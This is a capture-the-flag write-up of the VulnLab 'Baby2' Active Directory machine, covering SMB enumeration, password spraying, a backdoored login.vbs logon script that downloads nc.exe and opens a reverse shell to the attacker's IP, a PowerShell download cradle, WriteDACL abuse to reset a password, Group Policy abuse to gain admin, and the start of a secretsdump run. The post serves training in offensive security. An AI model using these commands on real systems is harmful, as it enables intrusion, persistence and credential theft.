---
title: "Baby2 VulnLab | GPO Misconfiguration"
description: "It’s Mohamed Eletreby, aka Maverick! I know you didn’t miss me this time, bruh but I’m back anyway with anotherVulnLabmachine. This one’s all about a real-world AD attack. First, we hit scanning, then"
pubDate: 2025-02-23
tags: ["Security Research", "Red Team"]
author: "Mohamed Eletrepy (maverick)"
readingTime: 16
coverImage: "https://cdn-images-1.medium.com/max/800/0*7N1UUbF7mO7Ux_s-.png"
---

---

![](https://cdn-images-1.medium.com/max/800/0*7N1UUbF7mO7Ux_s-.png)

### Baby2 VulnLab | GPO Misconfiguration

It’s Mohamed Eletreby, aka Maverick! I know you didn’t miss me this time, bruh but I’m back anyway with another [*VulnLab *](https://www.vulnlab.com/)machine. This one’s all about a real-world AD attack. First, we hit scanning, then dive into enumeration to dig up some juicy details. Let’s go!

#### Nmap

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/baby2]  
└─# nmap -p- --min-rate 10000 10.10.96.97  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-23 10:57 EET  
Nmap scan report for dc.baby2.vl (10.10.96.97)  
Host is up (0.81s latency).  
Not shown: 65523 filtered tcp ports (no-response)  
PORT STATE SERVICE  
53/tcp open domain  
88/tcp open kerberos-sec  
135/tcp open msrpc  
139/tcp open netbios-ssn  
445/tcp open microsoft-ds  
3269/tcp open globalcatLDAPssl  
3389/tcp open ms-wbt-server  
49664/tcp open unknown  
49667/tcp open unknown  
58075/tcp open unknown  
58082/tcp open unknown  
58097/tcp open unknown  
  
Nmap done: 1 IP address (1 host up) scanned in 46.50 seconds
```

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/baby2]  
└─# nmap -p 53,88,135,139,445,3269,3389,49664,49667,58075,58082,58097 -sCV 10.10.96.97  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-23 11:01 EET  
Nmap scan report for dc.baby2.vl (10.10.96.97)  
Host is up (0.65s latency).  
  
PORT STATE SERVICE VERSION  
53/tcp open domain Simple DNS Plus  
88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-02-23 09:11:20Z)  
135/tcp open msrpc Microsoft Windows RPC  
139/tcp open netbios-ssn Microsoft Windows netbios-ssn  
445/tcp open microsoft-ds?  
3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)  
|_ssl-date: TLS randomness does not represent time  
| ssl-cert: Subject: commonName=dc.baby2.vl  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.baby2.vl  
| Not valid before: 2025-02-23T04:36:40  
|_Not valid after: 2026-02-23T04:36:40  
3389/tcp open ms-wbt-server Microsoft Terminal Services  
| rdp-ntlm-info:  
| Target_Name: BABY2  
| NetBIOS_Domain_Name: BABY2  
| NetBIOS_Computer_Name: DC  
| DNS_Domain_Name: baby2.vl  
| DNS_Computer_Name: dc.baby2.vl  
| DNS_Tree_Name: baby2.vl  
| Product_Version: 10.0.20348  
|_ System_Time: 2025-02-23T09:12:21+00:00  
| ssl-cert: Subject: commonName=dc.baby2.vl  
| Not valid before: 2025-02-22T04:45:48  
|_Not valid after: 2025-08-24T04:45:48  
|_ssl-date: 2025-02-23T09:13:00+00:00; +9m18s from scanner time.  
49664/tcp open msrpc Microsoft Windows RPC  
49667/tcp open msrpc Microsoft Windows RPC  
58075/tcp open msrpc Microsoft Windows RPC  
58082/tcp open msrpc Microsoft Windows RPC  
58097/tcp open msrpc Microsoft Windows RPC  
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows  
  
Host script results:  
| smb2-time:  
| date: 2025-02-23T09:12:21  
|_ start_date: N/A  
|_clock-skew: mean: 9m17s, deviation: 0s, median: 9m17s  
| smb2-security-mode:  
| 3:1:1:  
|_ Message signing enabled and required  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 114.50 seconds
```

### Enumeration Begins Step 1: SMB & Kerberos

Alright, after scanning, we’ve got **LDAP, SMB, DNS, and Kerberos** staring at us like we owe them money. No surprises here just another day messing with Active Directory.

Now, let’s break it down like a proper heist plan:
🛠 **Step 1: SMB & Kerberos** Time to shake ’em down for any loose change.
 **LDAP? Nah, I’ll let you handle that one, buddy.**

Alright, enough chit-chat let’s see if SMB is feeling generous today. **Rolling in!**

---

### Step 1: SMB Enumeration

Alright, let’s see if SMB is in a generous mood. First, I’ll check if **anonymous login** is allowed and what files I can snoop on. Because, hey, sometimes admins leave the doors wide open.

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/baby2]  
└─# nxc smb baby2.vl -u mav -p '' --shares  
SMB 10.10.96.97 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:False)  
SMB 10.10.96.97 445 DC [+] baby2.vl\mav: (Guest)  
SMB 10.10.96.97 445 DC [*] Enumerated shares  
SMB 10.10.96.97 445 DC Share Permissions Remark  
SMB 10.10.96.97 445 DC ----- ----------- ------  
SMB 10.10.96.97 445 DC ADMIN$ Remote Admin  
SMB 10.10.96.97 445 DC apps READ  
SMB 10.10.96.97 445 DC C$ Default share  
SMB 10.10.96.97 445 DC docs  
SMB 10.10.96.97 445 DC homes READ,WRITE  
SMB 10.10.96.97 445 DC IPC$ READ Remote IPC  
SMB 10.10.96.97 445 DC NETLOGON READ Logon server share  
SMB 10.10.96.97 445 DC SYSVOL Logon server share
```

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/baby2]  
└─# smbclient -L //10.10.96.97/  
Password for [WORKGROUP\root]:  
  
Sharename Type Comment  
--------- ---- -------  
ADMIN$ Disk Remote Admin  
apps Disk  
C$ Disk Default share  
docs Disk  
homes Disk  
IPC$ IPC Remote IPC  
NETLOGON Disk Logon server share  
SYSVOL Disk Logon server share  
Reconnecting with SMB1 for workgroup listing.  
do_connect: Connection to 10.10.96.97 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)  
Unable to connect with SMB1 -- no workgroup available
```

As you can see from **NetExec** and **smbclient**, there are permissions on `apps`**, **`homes`**, and **`NETLOGON`, but in `homes`, there is both **read and write access**. Okay, let’s **surface everything manually using smbclient**. You can also use `-M spider_plus` in **NetExec** for spidering SMB shares or [manspider](https://github.com/blacklanternsecurity/MANSPIDER).

First in `homes`

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/baby2]  
└─# smbclient //10.10.96.97/homes  
Password for [WORKGROUP\root]:  
Try "help" to get a list of possible commands.  
smb: \> ls  
. D 0 Sat Sep 2 17:45:25 2023  
.. D 0 Tue Aug 22 23:10:21 2023  
Amelia.Griffiths D 0 Tue Aug 22 23:17:06 2023  
Carl.Moore D 0 Tue Aug 22 23:17:06 2023  
Harry.Shaw D 0 Tue Aug 22 23:17:06 2023  
Joan.Jennings D 0 Tue Aug 22 23:17:06 2023  
Joel.Hurst D 0 Tue Aug 22 23:17:06 2023  
Kieran.Mitchell D 0 Tue Aug 22 23:17:06 2023  
library D 0 Tue Aug 22 23:22:47 2023  
Lynda.Bailey D 0 Tue Aug 22 23:17:06 2023  
Mohammed.Harris D 0 Tue Aug 22 23:17:06 2023  
Nicola.Lamb D 0 Tue Aug 22 23:17:06 2023  
Ryan.Jenkins D 0 Tue Aug 22 23:17:06 2023  
  
6126847 blocks of size 4096. 2018223 blocks available  
smb: \> ls
```

Looks like there are some good users for spraying in the next stage, but let’s do some more **surfacing in other directories** first.

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/baby2]  
└─# smbclient //10.10.96.97/apps  
Password for [WORKGROUP\root]:  
Try "help" to get a list of possible commands.  
smb: \> ls  
. D 0 Thu Sep 7 22:12:59 2023  
.. D 0 Tue Aug 22 23:10:21 2023  
dev D 0 Thu Sep 7 22:13:50 2023  
  
6126847 blocks of size 4096. 2018978 blocks available  
smb: \> cd dev  
smb: \dev\> ls  
. D 0 Thu Sep 7 22:13:50 2023  
.. D 0 Thu Sep 7 22:12:59 2023  
CHANGELOG A 108 Thu Sep 7 22:16:15 2023  
login.vbs.lnk A 1800 Thu Sep 7 22:13:23 2023  
  
6126847 blocks of size 4096. 2018978 blocks available  
smb: \dev\> mget *  
Get file CHANGELOG? y  
getting file \dev\CHANGELOG of size 108 as CHANGELOG (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)  
Get file login.vbs.lnk? y  
getting file \dev\login.vbs.lnk of size 1800 as login.vbs.lnk (0.7 KiloBytes/sec) (average 0.4 KiloBytes/sec)  
smb: \dev\>
```

In **apps**, I found a file called **login.vbs.lnk**. Alright, let’s move on and check out **NETLOGON** this time.

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/baby2]  
└─# smbclient //10.10.96.97/NETLOGON  
Password for [WORKGROUP\root]:  
Try "help" to get a list of possible commands.  
smb: \> ls  
. D 0 Tue Aug 22 22:28:27 2023  
.. D 0 Tue Aug 22 20:43:55 2023  
login.vbs A 992 Sat Sep 2 17:55:51 2023  
  
6126847 blocks of size 4096. 2017296 blocks available  
smb: \> get login.vbs  
getting file \login.vbs of size 992 as login.vbs (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)  
smb: \> SMBecho failed (NT_STATUS_CONNECTION_RESET). The connection is disconnected now
```

Here, we found a **login.vbs** file. Let’s check out what’s inside and see if it holds anything interesting.

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/baby2]  
└─# cat login2.vbs  
Sub MapNetworkShare(sharePath, driveLetter)  
Dim objNetwork  
Set objNetwork = CreateObject("WScript.Network")  
  
' Check if the drive is already mapped  
Dim mappedDrives  
Set mappedDrives = objNetwork.EnumNetworkDrives  
Dim isMapped  
isMapped = False  
For i = 0 To mappedDrives.Count - 1 Step 2  
If UCase(mappedDrives.Item(i)) = UCase(driveLetter & ":") Then  
isMapped = True  
Exit For  
End If  
Next  
  
If isMapped Then  
objNetwork.RemoveNetworkDrive driveLetter & ":", True, True  
End If  
  
objNetwork.MapNetworkDrive driveLetter & ":", sharePath  
  
If Err.Number = 0 Then  
WScript.Echo "Mapped " & driveLetter & ": to " & sharePath  
Else  
WScript.Echo "Failed to map " & driveLetter & ": " & Err.Description  
End If  
  
Set objNetwork = Nothing  
End Sub  
  
MapNetworkShare "\\dc.baby2.vl\apps", "V"  
MapNetworkShare "\\dc.baby2.vl\docs", "L" 
```

Ahhh yes, **SMB the gift that keeps on giving.** There’s a lot of spicy stuff hiding in SMB shares, like scripts (just begging for a little tweaking to hand us initial access), NTLM hashes lying around like forgotten leftovers, and GPP files that can be decrypted for cleartext passwords. SMB is basically a hacker’s playground. But before we go all-in on modifying this script for a juicy reverse shell, let’s not forget about those users we found earlier — yeah, you totally forgot about them, didn’t you? 😂 So first, let’s hit them with some **password spraying** and see ??

But but but… **attention, my dear red teamers!** 🛑 If you’re in a **real red team engagement,** this stage needs to be done with stealth. 🚨 **Brute force is for script kiddies** — we go **low and slow.**

I highly recommend using the following tools for password spraying:

For a **stealthy** approach to password spraying (because we’re pros, not noisy script kiddies 😏), here are two solid tools:

🔹 [**LdapNomNom**](https://github.com/lkarlslund/ldapnomnom) — Perfect for **LDAP authentication** spraying, super silent.
🔹 [**CredMaster**](https://github.com/knavesec/CredMaster) — Smart spraying tool that avoids lockouts like a ninja.

Use these wisely, and remember: **stealth is king.** Now, let’s crack some creds.

Since we only have usernames that we **found** in SMB for now, let’s first verify which ones are legit using **Kerbrute** . Once we confirm the valid accounts, we’ll go full send with **password spraying** using **NetExec**. Yeah, yeah, I know **Kerbrute** can also handle spraying, but I’m rolling with **NetExec** this time because why not?

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/baby2]  
└─# kerbrute userenum -d baby2.vl clean_users.txt --dc 10.10.96.97  
  
__ __ __  
/ /_____ _____/ /_ _______ __/ /____  
/ //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \  
/ ,< / __/ / / /_/ / / / /_/ / /_/ __/  
/_/|_|\___/_/ /_.___/_/ \__,_/\__/\___/  
  
Version: v1.0.3 (9dad6e1) - 02/23/25 - Ronnie Flathers @ropnop  
  
2025/02/23 07:31:38 > Using KDC(s):  
2025/02/23 07:31:38 > 10.10.96.97:88  
  
2025/02/23 07:31:39 > [+] VALID USERNAME: Kieran.Mitchell@baby2.vl  
2025/02/23 07:31:39 > [+] VALID USERNAME: Amelia.Griffiths@baby2.vl  
2025/02/23 07:31:39 > [+] VALID USERNAME: Harry.Shaw@baby2.vl  
2025/02/23 07:31:39 > [+] VALID USERNAME: Mohammed.Harris@baby2.vl  
2025/02/23 07:31:39 > [+] VALID USERNAME: Carl.Moore@baby2.vl  
2025/02/23 07:31:39 > [+] VALID USERNAME: Lynda.Bailey@baby2.vl  
2025/02/23 07:31:39 > [+] VALID USERNAME: library@baby2.vl  
2025/02/23 07:31:39 > [+] VALID USERNAME: Joan.Jennings@baby2.vl  
2025/02/23 07:31:39 > [+] VALID USERNAME: Nicola.Lamb@baby2.vl  
2025/02/23 07:31:39 > [+] VALID USERNAME: Joel.Hurst@baby2.vl  
2025/02/23 07:31:39 > [+] VALID USERNAME: Ryan.Jenkins@baby2.vl  
2025/02/23 07:31:39 > Done! Tested 11 usernames (11 valid) in 1.216 seconds
```

Alright, time to **unleash the spray!** Let’s hit those valid usernames with **NetExec** and see if we can crack a login. Hope the admin got lazy with their passwords — fingers crossed!

```bash
# user this commadn to filter users in the smb `awk '{print $1}' users.txt | tee clean_users.txt`  
┌──(root㉿kali)-[/home/kali/VulnLab/baby2]  
└─# nxc smb baby2.vl -u clean_users.txt -p clean_users.txt --continue-on-success --no-bruteforce  
SMB 10.10.96.97 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:False)  
SMB 10.10.96.97 445 DC [-] baby2.vl\Amelia.Griffiths:Amelia.Griffiths STATUS_LOGON_FAILURE  
SMB 10.10.96.97 445 DC [+] baby2.vl\Carl.Moore:Carl.Moore  
SMB 10.10.96.97 445 DC [-] baby2.vl\Harry.Shaw:Harry.Shaw STATUS_LOGON_FAILURE  
SMB 10.10.96.97 445 DC [-] baby2.vl\Joan.Jennings:Joan.Jennings STATUS_LOGON_FAILURE  
SMB 10.10.96.97 445 DC [-] baby2.vl\Joel.Hurst:Joel.Hurst STATUS_LOGON_FAILURE  
SMB 10.10.96.97 445 DC [-] baby2.vl\Kieran.Mitchell:Kieran.Mitchell STATUS_LOGON_FAILURE  
SMB 10.10.96.97 445 DC [+] baby2.vl\library:library  
SMB 10.10.96.97 445 DC [-] baby2.vl\Lynda.Bailey:Lynda.Bailey STATUS_LOGON_FAILURE  
SMB 10.10.96.97 445 DC [-] baby2.vl\Mohammed.Harris:Mohammed.Harris STATUS_LOGON_FAILURE  
SMB 10.10.96.97 445 DC [-] baby2.vl\Nicola.Lamb:Nicola.Lamb STATUS_LOGON_FAILURE  
SMB 10.10.96.97 445 DC [-] baby2.vl\Ryan.Jenkins:Ryan.Jenkins STATUS_LOGON_FAILURE  
SMB 10.10.96.97 445 DC [+] baby2.vl\:
```

And here we go did you see that 😂😂

![](https://cdn-images-1.medium.com/max/800/0*zJUg7oc9jt1VeBdl.gif)

Alright, **Carl.Moore** and **Library** are in! With valid creds for **LDAP** and **SMB**, it’s time to bring out the big guns **BloodHound CE**. Let’s sniff around and see if we can find some juicy misconfigurations to escalate our privileges.

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/baby2]  
└─# nxc ldap 10.10.96.97 -u library -p library --bloodhound -c all --dns-server 10.10.96.97  
SMB 10.10.96.97 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:False)  
LDAP 10.10.96.97 389 DC [+] baby2.vl\library:library  
LDAP 10.10.96.97 389 DC Resolved collection methods: trusts, group, acl, psremote, container, localadmin, dcom, objectprops, sess  
ion, rdp  
[08:13:07] ERROR Unhandled exception in computer dc.baby2.vl processing: The NETBIOS connection with the remote host timed out. computers.py:269  
LDAP 10.10.96.97 389 DC Done in 01M 24S  
LDAP 10.10.96.97 389 DC Compressing output into /root/.nxc/logs/DC_10.10.96.97_2025-02-23_081143_bloodhound.zip
```

But first, let’s get that **initial access**! Before diving into **BloodHound**, I’m gonna **modify the login.vbs** to upload **nc.exe** and fire up a **reverse shell**. Stay tuned — this is where things get spicy!

Here’s the **login.vbs** with our **reverse shell payload**:

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/baby2]  
└─# cat login.vbs  
Sub MapNetworkShare(sharePath, driveLetter)  
Dim objNetwork  
Set objNetwork = CreateObject("WScript.Network")  
  
' Check if the drive is already mapped  
Dim mappedDrives  
Set mappedDrives = objNetwork.EnumNetworkDrives  
Dim isMapped  
isMapped = False  
For i = 0 To mappedDrives.Count - 1 Step 2  
If UCase(mappedDrives.Item(i)) = UCase(driveLetter & ":") Then  
isMapped = True  
Exit For  
End If  
Next  
  
If isMapped Then  
objNetwork.RemoveNetworkDrive driveLetter & ":", True, True  
End If  
  
objNetwork.MapNetworkDrive driveLetter & ":", sharePath  
  
If Err.Number = 0 Then  
WScript.Echo "Mapped " & driveLetter & ": to " & sharePath  
Else  
WScript.Echo "Failed to map " & driveLetter & ": " & Err.Description  
End If  
  
Set objNetwork = Nothing  
End Sub  
Set oShell = CreateObject("Wscript.Shell")  
oShell.run "cmd.exe /c mkdir C:\Temp"  
oShell.run "cmd.exe /c certutil -urlcache -f http://10.8.5.124:8888/nc.exe C:\Temp\nc.exe"  
oShell.run "cmd.exe /c C:\Temp\nc.exe 10.8.5.124 443 -e cmd.exe"  
MapNetworkShare "\\dc.baby2.vl\apps", "V"  
MapNetworkShare "\\dc.baby2.vl\docs", "L"
```

Before going all in, let’s check if the **nc.exe utility** is chilling in the same directory. If not, we spin up a **Python HTTP server** to host it. Then, we upload our **modified login.vbs** with the new **reverse shell payload**, fire up `nc -nlvp 443`, and kick back while we wait for that sweet, sweet shell.

![](https://cdn-images-1.medium.com/max/1200/1*N0Fy1Ug3_dtmzNmLDdn2zg.png)

*Initial Access*

In the **yellow arrow**, I fired up the **Python HTTP server** to serve `nc.exe`. In the **green arrow**, I set up the **listener** using `nc -nlvp 443`. And finally, in the **square**, I uploaded the **malicious reverse shell script** to execute and get that **sweet shell access**.

Now it’s time for **situational awareness** we need to figure out **where we are**, **what access we have**, and **how we can escalate privileges** like a true hacker mastermind. Let’s get digging!

![](https://cdn-images-1.medium.com/max/800/0*8IvJlepIrxWVuIW2.gif)

```powershell
C:\Windows\system32>whoami /all  
whoami /all  
  
USER INFORMATION  
----------------  
  
User Name SID  
====================== =============================================  
baby2\amelia.griffiths S-1-5-21-213243958-1766259620-4276976267-1114  
  
  
GROUP INFORMATION  
-----------------  
  
Group Name Type SID Attributes  
========================================== ================ ============================================= ==================================================  
Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group  
BUILTIN\Remote Desktop Users Alias S-1-5-32-555 Mandatory group, Enabled by default, Enabled group  
BUILTIN\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group  
BUILTIN\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Group used for deny only  
BUILTIN\Certificate Service DCOM Access Alias S-1-5-32-574 Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\INTERACTIVE Well-known group S-1-5-4 Mandatory group, Enabled by default, Enabled group  
CONSOLE LOGON Well-known group S-1-2-1 Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group  
LOCAL Well-known group S-1-2-0 Mandatory group, Enabled by default, Enabled group  
BABY2\office Group S-1-5-21-213243958-1766259620-4276976267-1104 Mandatory group, Enabled by default, Enabled group  
BABY2\legacy Group S-1-5-21-213243958-1766259620-4276976267-2601 Mandatory group, Enabled by default, Enabled group  
Authentication authority asserted identity Well-known group S-1-18-1 Mandatory group, Enabled by default, Enabled group  
Mandatory Label\Medium Mandatory Level Label S-1-16-8192  
  
PRIVILEGES INFORMATION  
----------------------  
  
Privilege Name Description State  
============================= ============================== ========  
SeMachineAccountPrivilege Add workstations to domain Disabled  
SeChangeNotifyPrivilege Bypass traverse checking Enabled  
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled  
  
ERROR: Unable to get user claims information.
```

```powershell
C:\Windows\system32>net user amelia.griffiths  
net user amelia.griffiths  
User name Amelia.Griffiths  
Full Name Amelia Griffiths  
Comment  
User's comment  
Country/region code 000 (System Default)  
Account active Yes  
Account expires Never  
  
Password last set 8/22/2023 11:18:21 AM  
Password expires Never  
Password changeable 8/23/2023 11:18:21 AM  
Password required No  
User may change password Yes  
  
Workstations allowed All  
Logon script \\baby2.vl\SYSVOL\baby2.vl\scripts\login.vbs  
User profile  
Home directory \\baby2.vl\homes\Amelia.Griffiths  
Last logon 2/22/2025 8:47:02 PM  
  
Logon hours allowed All  
  
Local Group Memberships *Remote Desktop Users  
Global Group memberships *office *Domain Users  
*legacy  
The command completed successfully.  
  
  
C:\Windows\system32>
```

Alright, back to **BloodHound**! Let’s set **Amelia** as the owned user and see what kind of spicy attack paths we can uncover. Time to hunt for that privilege escalation!

![](https://cdn-images-1.medium.com/max/1200/1*LVWIzSltqxVnOnwU8gHt1A.png)

![](https://cdn-images-1.medium.com/max/1200/1*csSUa9YA70gliXRgKjeynA.png)

Since we have access as **Amelia.Griffith**, we see that she’s part of the **Legacy** group, which has a **malicious DACL** on **GPOAdm**. This means we can abuse **WriteDACL** to escalate privileges. To do this smoothly, we’ll transfer **PowerView.py** to Amelia’s machine because it’s one of the best tools for identifying and exploiting **DACL misconfigurations**. From there, it’s just a matter of execution until we reach higher privileges.

Note: There are a bunch of tools for abusing **DACLs**, like [**impacket-dacledit**](https://github.com/ShutdownRepo/impacket/tree/dacledit), but I’ll let you explore that on your own in the[ **hacker recipes**](https://www.thehacker.recipes/ad/movement/dacl/grant-rights). Gotta keep some of the fun for you, right?

![diagram of the attack path](https://cdn-images-1.medium.com/max/800/1*3XVukVJhMBcAb0HwA6SpwQ.png)

*diagram of the attack path*

So, let’s transfer PowerView by setting up a Python server and running this command.

```powershell
IEX (New-Object Net.WebClient).DownloadString("http://10.8.5.124:1337/PowerView.ps1")
```

You can do a bunch of enumeration stuff with PowerView, but since we already have BloodHound, I’ll just use PowerView for abusing the WriteDACL misconfiguration.

```powershell
add-domainobjectacl -rights "all" -targetidentity "gpoadm" -principalidentity "Amelia.Griffiths"
```

```powershell
$cred = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
```

```powershell
set-domainuserpassword gpoadm -accountpassword $cred
```

Now, let’s validate that using NetExec.

```bash
┌──(root㉿kali)-[/opt/BloodHound.py]  
└─# nxc smb baby2.vl -u gpoadm -p 'Password123!'  
SMB 10.10.96.97 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:False)  
SMB 10.10.96.97 445 DC [+] baby2.vl\gpoadm:Password123! (Pwn3d!)
```

And here we go! 🚀 Let’s hop back into BloodHound, mark **gpoadm** as owned, and see what kind of mischief we can get into!

![](https://cdn-images-1.medium.com/max/1200/1*W0Hnv4symX2w5VB__tcaqA.png)

*Inbound Object Control of gpoadm*

Ohhh yeah! **gpoadm** has **GenericAll** on the **Default Domain Policy**, which means we can straight-up **modify the Group Policy** and push whatever we want across the domain. Time to **abuse GPO** and take things to the next level!

I’ll be using [**gpoabuse.py**](https://github.com/Hackndo/pyGPOAbuse) to pull off this attack. But first, we need the **GPO path**, which we can grab from the **BloodHound data**. Once we have that, it’s game time!

![](https://cdn-images-1.medium.com/max/1200/1*r-uMX9IUxB2ySIJmpwioLg.png)

*You can see here gpo file path*

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/baby2/pyGPOAbuse]  
└─# python3 pygpoabuse.py baby2.vl/GPOADM:'Password123!' -gpo-id "31B2F340-016D-11D2-945F-00C04FB984F9" -command 'net localgroup administrators GPOADM /add' -f  
  
/home/kali/VulnLab/baby2/pyGPOAbuse/pygpoabuse/scheduledtask.py:54: SyntaxWarning: invalid escape sequence '\%'  
self._task_str = f"""<ImmediateTaskV2 clsid="{{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}}" name="{self._name}" image="0" changed="{self._mod_date}" uid="{{{self._guid}}}"><Properties action="C" name="{self._name}" runAs="%LogonDomain%\%LogonUser%" logonType="InteractiveToken"><Task version="1.3"><RegistrationInfo><Author>{self._author}</Author><Description>{self._description}</Description></RegistrationInfo><Principals><Principal id="Author"><UserId>%LogonDomain%\%LogonUser%</UserId><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Settings><IdleSettings><Duration>PT10M</Duration><WaitTimeout>PT1H</WaitTimeout><StopOnIdleEnd>true</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>true</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable><AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>false</Hidden><RunOnlyIfIdle>false</RunOnlyIfIdle><WakeToRun>false</WakeToRun><ExecutionTimeLimit>P3D</ExecutionTimeLimit><Priority>7</Priority><DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter></Settings><Triggers><TimeTrigger><StartBoundary>%LocalTimeXmlEx%</StartBoundary><EndBoundary>%LocalTimeXmlEx%</EndBoundary><Enabled>true</Enabled></TimeTrigger></Triggers><Actions Context="Author"><Exec><Command>{self._shell}</Command><Arguments>{self._command}</Arguments></Exec></Actions></Task></Properties></ImmediateTaskV2>"""  
/home/kali/VulnLab/baby2/pyGPOAbuse/pygpoabuse/scheduledtask.py:54: SyntaxWarning: invalid escape sequence '\%'  
self._task_str = f"""<ImmediateTaskV2 clsid="{{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}}" name="{self._name}" image="0" changed="{self._mod_date}" uid="{{{self._guid}}}"><Properties action="C" name="{self._name}" runAs="%LogonDomain%\%LogonUser%" logonType="InteractiveToken"><Task version="1.3"><RegistrationInfo><Author>{self._author}</Author><Description>{self._description}</Description></RegistrationInfo><Principals><Principal id="Author"><UserId>%LogonDomain%\%LogonUser%</UserId><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Settings><IdleSettings><Duration>PT10M</Duration><WaitTimeout>PT1H</WaitTimeout><StopOnIdleEnd>true</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>true</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable><AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>false</Hidden><RunOnlyIfIdle>false</RunOnlyIfIdle><WakeToRun>false</WakeToRun><ExecutionTimeLimit>P3D</ExecutionTimeLimit><Priority>7</Priority><DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter></Settings><Triggers><TimeTrigger><StartBoundary>%LocalTimeXmlEx%</StartBoundary><EndBoundary>%LocalTimeXmlEx%</EndBoundary><Enabled>true</Enabled></TimeTrigger></Triggers><Actions Context="Author"><Exec><Command>{self._shell}</Command><Arguments>{self._command}</Arguments></Exec></Actions></Task></Properties></ImmediateTaskV2>"""  
SUCCESS:root:ScheduledTask TASK_05e6686c created!  
[+] ScheduledTask TASK_05e6686c created!
```

After running the attack, boom! 💥 You’re now rocking that **Administrator** access. Time to enjoy the view from the top! You can verify this by checking Amelia’s permissions she now has access to the **Administrator** account. From here, you’ve got options: either switch directly to **Administrator** from **gpoadm**, or go full savage mode and dump the NT hash of **Administrator**. Do whatever you want, man you **own** this box now!

![](https://cdn-images-1.medium.com/max/800/0*kz5BRpeIswhptf34.gif)

```powershell
┌──(root㉿kali)-[/opt/BloodHound.py]  
└─# evil-winrm -i baby2.vl -u gpoadm -p 'Password123!'  
  
Evil-WinRM shell v3.5  
  
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine  
  
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  
  
Info: Establishing connection to remote endpoint  
*Evil-WinRM* PS C:\Users\gpoadm\Desktop> cd ../../  
*Evil-WinRM* PS C:\Users> dir  
  
  
Directory: C:\Users  
  
  
Mode LastWriteTime Length Name  
---- ------------- ------ ----  
d----- 8/22/2023 10:08 AM Administrator  
d----- 8/22/2023 12:54 PM Amelia.Griffiths  
d----- 2/22/2025 11:32 PM gpoadm  
d-r--- 2/22/2025 11:21 PM Public  
  
  
*Evil-WinRM* PS C:\Users> cd Administrator  
*Evil-WinRM* PS C:\Users\Administrator> cd desktop  
*Evil-WinRM* PS C:\Users\Administrator\desktop> cat root.txt  
VL{f0205b652-------------------  
*Evil-WinRM* PS C:\Users\Administrator\desktop>
```

```shell
┌──(root㉿kali)-[/home/kali/VulnLab/baby2/pyGPOAbuse]  
└─# impacket-secretsdump baby2.vl/gpoadm:'Password123!'@10.10.96.97  
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies  
  
[*] Service RemoteRegistry is in stopped state  
[*] Starting service RemoteRegistry  
